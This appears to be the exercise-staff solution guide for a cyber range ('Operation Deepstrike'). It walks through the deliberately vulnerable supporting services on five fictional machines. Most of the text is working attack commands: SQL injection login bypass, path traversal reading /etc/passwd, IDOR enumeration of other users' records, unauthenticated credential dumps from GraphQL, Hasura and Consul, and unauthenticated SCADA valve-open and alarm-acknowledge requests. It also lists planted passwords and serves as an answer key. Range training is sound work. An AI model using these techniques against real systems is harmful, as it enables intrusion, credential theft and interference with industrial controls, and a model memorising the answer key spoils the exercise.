# Honeytraps-R1-sol.md
## Exploitation Guide — Range 1 Supporting Services
**Range:** RNG-EXT-01 · SETU DVAAR · OPERATION DEEPSTRIKE

All vulnerabilities listed here are on supporting services (not the primary challenge machines).
They are intentionally simpler than the main machine vulnerabilities and serve as alternative
credential or information sources, reconnaissance paths, or rabbit holes.

---

## M1 Supporting Services (203.x.x.10)

### M1-S1 — RPAL QHSE Compliance Portal `:7443`
**Vulnerability:** SQL Injection in login (CWE-89)
**Impact:** Bypass authentication, access all HSE inspection records

The login form constructs a query directly with unsanitised input:
```sql
SELECT * FROM users WHERE username='{input}' AND password='...'
```

**Exploit:**
```
Username: admin'--
Password: anything
```
The `--` comments out the password check. Any username ending with `'--` logs in.

Full dump via union:
```
Username: ' UNION SELECT 1,'union_user','x','admin'--
```

**curl:**
```bash
curl -s -X POST http://203.x.x.10:7443/qhse/login \
  -d "username=admin'--&password=x" -c /tmp/qhse.jar -L | grep -i inspection
```

---

### M1-S2 — DGH Block Licensing Registry `:9443`
**Vulnerability:** Path Traversal in document download (CWE-22)
**Primary Impact:** Credential discovery — developer notes file contains M1 portal login credentials
**Secondary Impact:** Read arbitrary files readable by the `nobody` service user

The `?doc=` parameter is joined directly to the document root without sanitisation:
```python
full_path = os.path.join(DOC_ROOT, doc)
open(full_path, 'r').read()  # no realpath check
```

**Step 1 — Find the dev notes file via HTML source inspection (M1 primary credential discovery):**
```bash
# View source of the DGH Registry page — find developer TODO comment
curl -s http://203.x.x.10:9443/ | grep -i "todo\|note\|remove\|delete"
# Returns: <!-- TODO(arjun.mehta): DEVOPS-1089 — remove dev-notes.txt from docs dir ... -->

# Retrieve the file using the path traversal endpoint
curl "http://203.x.x.10:9443/registry/download?doc=dev-notes.txt"
```

**Secondary path:** `dev-notes.txt` is in SecLists `raft-medium-words.txt` — also found
via `ffuf -u http://203.x.x.10:9443/registry/download?doc=FUZZ -w raft-medium-words.txt -mc 200`

**Returns — M1 portal credentials:**
```
RPAL Exploration Portal — DGH Demo Environment Setup Notes
Test contractor accounts for DGH integration demonstration (DEVOPS-1089):
  Account 1  : contractor.01 / Contractor@2024!   (Gulf Drilling Solutions)
  Account 2  : contractor.02 / Gulf@Drilling#24!  (Mahindra Energy)
NOTE: Jira DEVOPS-1089 — these test credentials must be rotated before go-live.
```

**This is the intended credential discovery path for M1 (main challenge).**
Use `contractor.01 / Contractor@2024!` to log in to the permit portal on `:8443`,
obtain a JWT, then mount the RS256→HS256 algorithm confusion attack.

**Step 2 — General path traversal (secondary exploitation):**
```bash
# Read /etc/passwd
curl "http://203.x.x.10:9443/registry/download?doc=../../etc/passwd"

# Read application source code
curl "http://203.x.x.10:9443/registry/download?doc=../app.py"

# Read permit portal access log (reveals JWT tokens in use)
curl "http://203.x.x.10:9443/registry/download?doc=../../../var/log/rpal/permit-portal/access.log"
```

Interesting files to try:
- `../../etc/hostname`
- `../../../var/lib/rpal/permit-portal/permits.db` (SQLite — binary but contains records)
- `../../../var/log/rpal/permit-portal/access.log`

---

### M1-S3 — Environmental Clearance System `:8880`
**Vulnerability:** Insecure Direct Object Reference (CWE-284)
**Impact:** Access any application including confidential internal MoEFCC notes

The application detail endpoint has no ownership check:
```python
@app.route('/ecms/application/<int:app_id>')
def application_detail(app_id):
    # No check that app_id belongs to flask.session['uid']
    application = conn.execute('SELECT * FROM applications WHERE id=?', (app_id,))
```

**Exploit — login as contractor.01 then access contractor.02's application:**
```bash
# Login
curl -s -X POST http://203.x.x.10:8880/ecms/login \
  -d "username=contractor.01&password=c01pass" -c /tmp/ecms.jar -L

# Access your own application (ID 1)
curl -s http://203.x.x.10:8880/ecms/application/1 -b /tmp/ecms.jar

# IDOR — access competitor's application (ID 2) — reveals internal MoEFCC notes
curl -s http://203.x.x.10:8880/ecms/application/2 -b /tmp/ecms.jar

# Enumerate all applications
for i in 1 2 3; do
  echo "=== App $i ===" && curl -s "http://203.x.x.10:8880/ecms/application/$i" -b /tmp/ecms.jar
done
```

Application 2 exposes: `"Applicant has political connections — fast-track per DPIIT instruction"`
Application 3 exposes: `"Flagged for prior violation at Niyamgiri — additional scrutiny required"`

---

## M2 Supporting Services (203.x.x.20)

### M2-S1 — Apollo Studio `:4001`
**Vulnerability:** GraphQL introspection enabled — full schema exposure + serviceCredentials query
**Impact:** Reveals all query types including the hidden `serviceCredentials` resolver

```bash
# Introspect schema
curl -s -X POST http://203.x.x.20:4001/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name fields { name description } } } }"}' \
  | python3 -m json.tool

# Query the hidden serviceCredentials field (not in docs, revealed by introspection)
curl -s -X POST http://203.x.x.20:4001/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ serviceCredentials { service endpoint password apiKey } }"}' \
  | python3 -m json.tool
```

Returns: SOAP gateway password and GraphQL API key without any authentication.

---

### M2-S2 — Hasura Console `:3100`
**Vulnerability:** Admin console accessible without `X-Hasura-Admin-Secret` header
**Impact:** Direct SQL execution, access to all tables including service_accounts

```bash
# Browse the console (renders full admin UI with credentials in table)
curl -s http://203.x.x.20:3100/

# Run SQL via the query endpoint — no auth header required
curl -s -X POST http://203.x.x.20:3100/v2/query \
  -H "Content-Type: application/json" \
  -d '{"type":"run_sql","args":{"sql":"SELECT * FROM service_accounts"}}' \
  | python3 -m json.tool

# GraphQL query without X-Hasura-Admin-Secret
curl -s -X POST http://203.x.x.20:3100/v1/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ service_accounts { username service password } }"}' \
  | python3 -m json.tool
```

---

### M2-S3 — Swagger UI `:5000`
**Vulnerability:** Undocumented endpoint not listed in Swagger docs
**Impact:** Returns all service API keys and passwords — no authentication

The endpoint `/api/v1/internal/tokens` is not in the Swagger documentation but exists.
Discoverable via directory brute-force:

```bash
# Direct access — no auth required
curl -s http://203.x.x.20:5000/api/v1/internal/tokens | python3 -m json.tool

# Or find it with ffuf
ffuf -u http://203.x.x.20:5000/api/v1/FUZZ \
  -w /usr/share/wordlists/dirb/common.txt \
  -mc 200
```

---

## M3 Supporting Services (203.x.x.30)

### M3-S1 — PNGRB Tariff Portal `:8081`
**Vulnerability:** Default credentials (CWE-798)
**Impact:** Access confidential PNGRB internal notes on tariff orders

**Default credentials:**
- `pngrb_admin` / `PNGRB@2024`
- `tariff.analyst` / `TariffAna!2024`

```bash
curl -s -X POST http://203.x.x.30:8081/pngrb/login \
  -d "username=pngrb_admin&password=PNGRB@2024" -c /tmp/pngrb.jar -L \
  | grep -i "internal\|note\|escalate"
```

Reveals internal notes including: operator lobbying for rate increases and provisional orders
not yet published.

---

### M3-S2 — Pipeline SCADA HMI `:9090`
**Vulnerability:** No authentication on industrial control interface
**Impact:** Acknowledge alarms and send valve control commands without credentials

```bash
# Access the HMI directly — no login required
curl -s http://203.x.x.30:9090/

# Acknowledge an active alarm
curl -s -X POST http://203.x.x.30:9090/scada/ack \
  -H "Content-Type: application/json" \
  -d '{"alarm_id":"ALM-0091"}' | python3 -m json.tool

# Send a valve open command
curl -s -X POST http://203.x.x.30:9090/scada/valve \
  -H "Content-Type: application/json" \
  -d '{"valve":"EV-HVJ-001","state":"OPEN"}' | python3 -m json.tool

# Get full system status
curl -s http://203.x.x.30:9090/scada/status | python3 -m json.tool
```

---

### M3-S3 — WS-Security Certificate Portal `:7080`
**Vulnerability:** Unauthenticated certificate export (CWE-284)
**Impact:** Certificate file for `rpal-tariff-gw-2024` contains the SOAP service password

```bash
# Export the gateway certificate — no auth required
curl -s "http://203.x.x.30:7080/certs/export?cn=rpal-tariff-gw-2024" -o cert.pem
cat cert.pem | grep -i "password\|key\|secret"
# Reveals: SOAP_SVC_PASSWORD: TariffGW@Soap!2024#RPAL
```

---

## M4 Supporting Services (203.x.x.40)

### M4-S1 — Kong Gateway Manager `:8404`
**Vulnerability:** REST API returns upstream credentials without authentication
**Impact:** Full list of registered services with upstream auth parameters

```bash
# Admin console (renders table with credentials)
curl -s http://203.x.x.40:8404/

# API endpoint — returns plaintext upstream_auth and upstream_api_key
curl -s http://203.x.x.40:8404/api/v2/services | python3 -m json.tool
# Returns: TariffGW@Soap!2024#RPAL and RPAL-API-2024-XK9mP3nT8qRs
```

---

### M4-S2 — Consul Service Mesh `:8500`
**Vulnerability:** ACL not enabled — KV store readable without token
**Impact:** All service credentials stored in KV are exposed

```bash
# Enumerate all KV keys recursively — no token required
curl -s "http://203.x.x.40:8500/v1/kv/?recurse" | python3 -m json.tool

# Decode base64 values
curl -s "http://203.x.x.40:8500/v1/kv/?recurse" | \
  python3 -c "
import sys, json, base64
for item in json.load(sys.stdin):
    print(item['Key'], '=', base64.b64decode(item['Value']).decode())
"
# Reveals: LDAP bind password, tariff service password, API keys
```

---

### M4-S3 — Zipkin Distributed Tracing `:9411`
**Vulnerability:** No authentication — trace data reveals internal topology and credentials
**Impact:** Service names, internal IPs, and JWT algorithm information in trace tags

```bash
# Get all registered services
curl -s http://203.x.x.40:9411/api/v2/services

# Get all traces — reveals internal IPs and credential hints in span tags
curl -s "http://203.x.x.40:9411/api/v2/traces" | python3 -m json.tool
# Note: one trace has tag jwt.alg=HS256 — hints at JWT algorithm confusion on M1
```

---

## M5 Supporting Services (203.x.x.50)

### M5-S1 — Vendor Management System `:9001`
**Vulnerability:** Mass assignment — PUT without authentication changes vendor status
**Impact:** Approve any pending vendor, potentially bypass procurement controls

```bash
# Change a pending vendor to approved
curl -s -X PUT http://203.x.x.50:9001/api/vendors/VND-002 \
  -H "Content-Type: application/json" \
  -d '{"status":"APPROVED"}' | python3 -m json.tool

# Enumerate all vendors
curl -s http://203.x.x.50:9001/api/vendors/VND-001 | python3 -m json.tool
curl -s http://203.x.x.50:9001/api/vendors/VND-004 | python3 -m json.tool
```

---

### M5-S2 — HSE Document Repository `:7443`
**Vulnerability:** Unauthenticated document download — restricted docs accessible (CWE-284)
**Impact:** Documents contain internal credentials including the netmon agent PSK

```bash
# Download restricted documents without login
curl -s http://203.x.x.50:7443/api/documents/2/download -o ERP.txt
curl -s http://203.x.x.50:7443/api/documents/3/download -o audit.txt
cat ERP.txt
# Reveals: NetMon@AgentKey!RPAL24 (netmon agent PSK planted in document)
```

---

### M5-S3 — Invoice & Payment Portal `:8800`
**Vulnerability:** IDOR — invoice_id not validated against authenticated vendor (CWE-284)
**Impact:** Access all vendors' invoice details including bank account numbers and IFSC codes

```bash
# Login as contractor.01
curl -s -X POST http://203.x.x.50:8800/invoice/login \
  -d "username=contractor.01&password=c01inv!" -c /tmp/inv.jar -L

# Access own invoice
curl -s http://203.x.x.50:8800/api/invoices/1 -b /tmp/inv.jar | python3 -m json.tool

# IDOR — access other vendors' invoices (IDs 2, 3, 4)
for i in 1 2 3 4; do
  echo "=== Invoice $i ===" && curl -s "http://203.x.x.50:8800/api/invoices/$i" -b /tmp/inv.jar | python3 -m json.tool
done
# Invoice 4: L&T EPC services with bank account 1111222233 SBIN0007890
```

---

## Summary Table

| Machine | Port | Service | Vulnerability | Credential / Data Exposed |
|---|---|---|---|---|
| M1 | 7443 | QHSE Portal | SQL Injection | Auth bypass, HSE records |
| M1 | 9443 | DGH Registry | Path Traversal | Arbitrary file read |
| M1 | 8880 | Env Clearance | IDOR | Competitor internal notes |
| M2 | 4001 | Apollo Studio | GraphQL Introspection | SOAP password, API key |
| M2 | 3100 | Hasura Console | No auth on admin UI | All DB tables including service_accounts |
| M2 | 5000 | Swagger UI | Hidden endpoint | Service credentials |
| M3 | 8081 | PNGRB Portal | Default credentials | Internal tariff notes |
| M3 | 9090 | Pipeline SCADA | No authentication | Alarm ack, valve control |
| M3 | 7080 | WS-Sec Certs | No auth on cert export | SOAP service password |
| M4 | 8404 | Kong Manager | Unauthenticated API | Upstream service credentials |
| M4 | 8500 | Consul Mesh | ACL disabled | LDAP password, all service creds |
| M4 | 9411 | Zipkin | No authentication | Internal topology, JWT alg hint |
| M5 | 9001 | Vendor Mgmt | Mass Assignment | Vendor status manipulation |
| M5 | 7443 | HSE Docs | Unauth download | netmon agent PSK in document |
| M5 | 8800 | Invoice Portal | IDOR | Bank accounts of all vendors |

---
*Honeytraps-R1-sol.md | RNG-EXT-01 SETU DVAAR | OPERATION DEEPSTRIKE*
*Classification: RESTRICTED — Exercise Staff Only*
